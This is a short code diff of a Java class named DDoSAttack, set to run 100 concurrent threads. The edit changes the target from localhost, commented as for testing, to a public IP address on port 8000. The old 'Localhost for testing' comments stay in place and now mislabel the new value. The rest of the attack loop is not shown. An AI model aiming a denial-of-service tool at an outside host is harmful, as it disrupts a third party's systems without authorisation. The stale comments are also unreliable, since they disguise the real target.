@@ -4,8 +4,8 @@ import java.net.Socket;
 
 public class DDoSAttack {
     public static void main(String[] args) {
-        String targetIp = "localhost"; // Localhost for testing
-        int targetPort = 8080; // Port used by the Python HTTP server
+        String targetIp = "100.26.31.176/"; // Localhost for testing
+        int targetPort = 8000; // Port used by the Python HTTP server
         int numberOfThreads = 100; // Number of concurrent threads
 
         for (int i = 0; i < numberOfThreads; i++) {
